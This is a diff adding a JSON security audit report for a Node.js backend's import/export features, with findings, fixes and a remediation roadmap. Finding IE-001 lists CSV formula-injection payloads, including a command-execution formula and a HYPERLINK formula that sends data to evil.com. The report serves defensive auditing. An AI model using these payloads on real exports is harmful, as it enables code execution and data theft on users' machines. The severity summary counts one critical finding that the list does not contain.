@@ -1,0 +1,417 @@
+{
+  "scan_date": "2025-12-22",
+  "repository": "https://github.com/mischa23v/traf3li-backend",
+  "scope": "Import/Export Security Audit",
+  "overall_severity": "HIGH",
+  "summary": {
+    "total_vulnerabilities": 9,
+    "critical": 1,
+    "high": 3,
+    "medium": 4,
+    "low": 1,
+    "informational": 2
+  },
+  "vulnerabilities": [
+    {
+      "id": "IE-001",
+      "title": "CSV Injection (Formula Injection) in Export",
+      "severity": "HIGH",
+      "status": "VULNERABLE",
+      "cvss_score": 7.5,
+      "location": {
+        "file": "traf3li-backend-for testing only different github/src/controllers/benefit.controller.js",
+        "lines": "813-836",
+        "function": "exportBenefits",
+        "endpoint": "GET /api/benefits/export?format=csv"
+      },
+      "description": "CSV export does not sanitize user input, allowing formula injection attacks. Attackers can inject malicious formulas that execute when the CSV is opened in Excel/Google Sheets.",
+      "attack_vectors": [
+        "=1+1 (basic formula)",
+        "=cmd|'/c calc.exe'!A1 (command execution)",
+        "@SUM(1+1) (Google Sheets)",
+        "=HYPERLINK(\"http://evil.com?data=\"&A1,\"Click\") (data exfiltration)"
+      ],
+      "impact": [
+        "Remote code execution on user's machine",
+        "Data exfiltration",
+        "DDoS attacks via external requests",
+        "Session hijacking"
+      ],
+      "remediation": {
+        "priority": "IMMEDIATE",
+        "effort": "4 hours",
+        "fix": "Implement sanitizeCsvField() function to remove formula prefixes (=, +, -, @) and escape special characters"
+      },
+      "references": [
+        "https://owasp.org/www-community/attacks/CSV_Injection",
+        "https://cwe.mitre.org/data/definitions/1236.html"
+      ]
+    },
+    {
+      "id": "IE-002",
+      "title": "Missing CSV Import Validation",
+      "severity": "HIGH",
+      "status": "NOT_IMPLEMENTED",
+      "cvss_score": 7.0,
+      "location": {
+        "file": "N/A",
+        "note": "CSV import functionality not implemented"
+      },
+      "description": "No CSV import functionality exists. When implemented, must include proper validation to prevent injection attacks and data corruption.",
+      "required_controls": [
+        "File size limits (5MB)",
+        "Row count limits (10,000 rows)",
+        "Column validation",
+        "Data type validation",
+        "Input sanitization",
+        "Magic number verification"
+      ],
+      "remediation": {
+        "priority": "HIGH",
+        "effort": "16 hours",
+        "fix": "Implement secure CSV import with ImportValidator class"
+      }
+    },
+    {
+      "id": "IE-003",
+      "title": "Missing Excel Import Validation",
+      "severity": "HIGH",
+      "status": "NOT_IMPLEMENTED",
+      "cvss_score": 7.0,
+      "location": {
+        "file": "N/A",
+        "note": "Excel import functionality not implemented"
+      },
+      "description": "No Excel import functionality exists. When implemented, must disable formula execution and validate all cell data.",
+      "required_controls": [
+        "File size limits (10MB)",
+        "Sheet limits (10 sheets)",
+        "Row count limits (50,000 rows)",
+        "Disable formula execution",
+        "Block macros",
+        "Validate cell data types"
+      ],
+      "remediation": {
+        "priority": "HIGH",
+        "effort": "16 hours",
+        "fix": "Implement secure Excel import with xlsx library and strict validation"
+      }
+    },
+    {
+      "id": "IE-004",
+      "title": "Weak File Type Validation in Upload",
+      "severity": "MEDIUM",
+      "status": "VULNERABLE",
+      "cvss_score": 5.5,
+      "location": {
+        "file": "traf3li-backend-for testing only different github/src/configs/multer.js",
+        "lines": "22-33",
+        "affected_routes": [
+          "POST /api/messages"
+        ]
+      },
+      "description": "File upload validation only checks MIME type and extension, not file content. Attackers can upload malicious files with spoofed extensions.",
+      "vulnerabilities": [
+        "MIME type spoofing",
+        "Extension spoofing",
+        "No magic number verification",
+        "No malware scanning"
+      ],
+      "remediation": {
+        "priority": "HIGH",
+        "effort": "8 hours",
+        "fix": "Add file-type library for magic number verification and validate file content matches extension"
+      }
+    },
+    {
+      "id": "IE-005",
+      "title": "Missing Bulk Operation Limits",
+      "severity": "MEDIUM",
+      "status": "VULNERABLE",
+      "cvss_score": 5.0,
+      "location": {
+        "file": "traf3li-backend-for testing only different github/src/controllers/benefit.controller.js",
+        "lines": "364-396",
+        "function": "bulkDeleteBenefits",
+        "endpoint": "POST /api/benefits/bulk-delete"
+      },
+      "description": "Bulk delete operations have no array size limits, rate limiting, or transaction support. Can lead to DoS and data inconsistency.",
+      "vulnerabilities": [
+        "No maximum array size",
+        "No rate limiting",
+        "No transaction rollback",
+        "Missing audit logging"
+      ],
+      "impact": [
+        "Denial of Service via large deletions",
+        "Database performance degradation",
+        "Data inconsistency on partial failures",
+        "Compliance violations (no audit trail)"
+      ],
+      "remediation": {
+        "priority": "HIGH",
+        "effort": "8 hours",
+        "fix": "Add max array size (100), implement rate limiting, add transaction support, and create audit logs"
+      }
+    },
+    {
+      "id": "IE-006",
+      "title": "Excessive File Size Limits",
+      "severity": "MEDIUM",
+      "status": "VULNERABLE",
+      "cvss_score": 4.5,
+      "location": {
+        "file": "traf3li-backend-for testing only different github/src/configs/multerPdf.js",
+        "lines": "74-76"
+      },
+      "description": "Template upload allows 50MB files without rate limiting, potentially leading to disk exhaustion DoS.",
+      "current_limits": {
+        "template_uploads": "50MB",
+        "pdf_uploads": "20MB",
+        "message_attachments": "10MB per file, 5 files max"
+      },
+      "recommended_limits": {
+        "template_uploads": "10MB",
+        "pdf_uploads": "10MB",
+        "message_attachments": "5MB per file, 3 files max"
+      },
+      "remediation": {
+        "priority": "MEDIUM",
+        "effort": "2 hours",
+        "fix": "Reduce file size limits and add rate limiting on upload endpoints"
+      }
+    },
+    {
+      "id": "IE-007",
+      "title": "Missing Audit Logging for Exports and Bulk Operations",
+      "severity": "MEDIUM",
+      "status": "MISSING",
+      "cvss_score": 4.0,
+      "compliance_impact": [
+        "PDPL violation - cannot prove data access",
+        "GDPR violation - no audit trail for data portability",
+        "SOC2 non-compliance"
+      ],
+      "location": {
+        "affected_functions": [
+          "exportBenefits",
+          "bulkDeleteBenefits",
+          "bulkDeleteTasks"
+        ]
+      },
+      "description": "No audit logging for data exports or bulk operations, violating PDPL/GDPR requirements for data access tracking.",
+      "required_logging": [
+        "Export operations (what data, when, by whom)",
+        "Bulk deletions (what was deleted, count)",
+        "Import operations (source, count, validation results)",
+        "IP address and user agent"
+      ],
+      "remediation": {
+        "priority": "HIGH",
+        "effort": "10 hours",
+        "fix": "Create AuditLog model and add logging to all export/bulk operations"
+      }
+    },
+    {
+      "id": "IE-008",
+      "title": "Missing Transaction Support in Bulk Operations",
+      "severity": "LOW",
+      "status": "MISSING",
+      "cvss_score": 3.0,
+      "location": {
+        "affected_functions": [
+          "bulkDeleteBenefits",
+          "bulkDeleteTasks"
+        ]
+      },
+      "description": "Bulk operations do not use MongoDB transactions, leading to inconsistent state on partial failures.",
+      "impact": [
+        "Data inconsistency on failures",
+        "No rollback mechanism",
+        "Difficult error recovery"
+      ],
+      "remediation": {
+        "priority": "MEDIUM",
+        "effort": "8 hours",
+        "fix": "Implement MongoDB session transactions with rollback support"
+      }
+    },
+    {
+      "id": "IE-009",
+      "title": "Missing Export Encryption",
+      "severity": "LOW",
+      "status": "MISSING",
+      "cvss_score": 2.5,
+      "location": {
+        "affected_functions": [
+          "exportBenefits"
+        ]
+      },
+      "description": "Exported files are not encrypted, exposing sensitive data if intercepted or stored insecurely.",
+      "recommendation": "Add optional password protection and encryption for sensitive exports",
+      "remediation": {
+        "priority": "LOW",
+        "effort": "12 hours",
+        "fix": "Implement export encryption with password protection option"
+      }
+    }
+  ],
+  "positive_findings": [
+    {
+      "title": "Excellent Path Traversal Protection",
+      "location": "traf3li-backend-for testing only different github/src/controllers/task.controller.js:501-585",
+      "description": "Task attachment deletion implements comprehensive path traversal protection with multiple validation layers",
+      "security_controls": [
+        "Null byte detection",
+        "Directory traversal detection (..)",
+        "Path normalization",
+        "Absolute path verification",
+        "Suspicious pattern detection"
+      ],
+      "recommendation": "Apply this pattern to all file operations"
+    },
+    {
+      "title": "Good Input Validation in PDF Controller",
+      "location": "traf3li-backend-for testing only different github/src/controllers/pdfme.controller.js",
+      "description": "PDF controller implements proper filename sanitization and string validation",
+      "security_controls": [
+        "Filename sanitization",
+        "String length validation",
+        "Search input sanitization",
+        "ObjectId validation"
+      ],
+      "recommendation": "Use as template for other controllers"
+    }
+  ],
+  "missing_dependencies": {
+    "required_for_security": [
+      {
+        "package": "csv-parser",
+        "version": "^3.0.0",
+        "purpose": "Secure CSV parsing"
+      },
+      {
+        "package": "csvtojson",
+        "version": "^2.0.10",
+        "purpose": "CSV to JSON conversion"
+      },
+      {
+        "package": "xlsx",
+        "version": "^0.18.5",
+        "purpose": "Excel parsing with formula disabling"
+      },
+      {
+        "package": "file-type",
+        "version": "^18.0.0",
+        "purpose": "Magic number verification"
+      },
+      {
+        "package": "sanitize-html",
+        "version": "^2.11.0",
+        "purpose": "HTML sanitization"
+      },
+      {
+        "package": "validator",
+        "version": "^13.11.0",
+        "purpose": "Input validation"
+      }
+    ],
+    "already_installed": [
+      "helmet (^7.1.0)",
+      "express-rate-limit (^8.2.1)",
+      "multer (^1.4.5-lts.1)"
+    ]
+  },
+  "remediation_roadmap": {
+    "week_1_critical": {
+      "tasks": [
+        "Fix CSV injection in exportBenefits (4 hours)",
+        "Add bulk operation limits (6 hours)",
+        "Add rate limiting to bulk endpoints (2 hours)"
+      ],
+      "total_effort": "12 hours"
+    },
+    "week_2_3_high": {
+      "tasks": [
+        "Implement file type validation with magic numbers (8 hours)",
+        "Create ImportValidator class (12 hours)",
+        "Add audit logging framework (10 hours)",
+        "Reduce file size limits (2 hours)"
+      ],
+      "total_effort": "32 hours"
+    },
+    "week_4_6_medium": {
+      "tasks": [
+        "Implement secure CSV import (16 hours)",
+        "Implement secure Excel import (16 hours)",
+        "Add transaction support to bulk ops (8 hours)"
+      ],
+      "total_effort": "40 hours"
+    },
+    "week_7_8_low": {
+      "tasks": [
+        "Implement export encryption (12 hours)",
+        "Add virus scanning integration (16 hours)"
+      ],
+      "total_effort": "28 hours"
+    }
+  },
+  "compliance_impact": {
+    "pdpl": {
+      "violations": [
+        "No audit trail for data exports",
+        "No consent verification for exports",
+        "Missing data minimization in exports"
+      ],
+      "risk_level": "HIGH"
+    },
+    "gdpr": {
+      "violations": [
+        "Right to data portability - incomplete implementation",
+        "Right to erasure - missing proper logging",
+        "Data breach risk from CSV injection"
+      ],
+      "risk_level": "HIGH"
+    },
+    "soc2": {
+      "violations": [
+        "No audit logging for sensitive operations",
+        "Weak access controls on bulk operations"
+      ],
+      "risk_level": "MEDIUM"
+    }
+  },
+  "test_coverage": {
+    "required_tests": [
+      "CSV injection prevention tests",
+      "Bulk operation limit tests",
+      "File upload validation tests",
+      "Path traversal prevention tests",
+      "Audit logging verification tests"
+    ],
+    "current_coverage": "0% (no security tests found)"
+  },
+  "recommendations": {
+    "immediate": [
+      "Deploy CSV injection fix to production",
+      "Add bulk operation limits",
+      "Enable rate limiting on bulk endpoints"
+    ],
+    "short_term": [
+      "Implement comprehensive audit logging",
+      "Add file type validation with magic numbers",
+      "Create import validation framework"
+    ],
+    "long_term": [
+      "Implement CSV/Excel import functionality securely",
+      "Add export encryption",
+      "Integrate virus scanning",
+      "Achieve full PDPL/GDPR compliance"
+    ]
+  },
+  "contact": {
+    "report_generated_by": "Claude (Anthropic AI)",
+    "scan_type": "Static Application Security Testing (SAST)",
+    "next_review_date": "2026-01-22"
+  }
+}
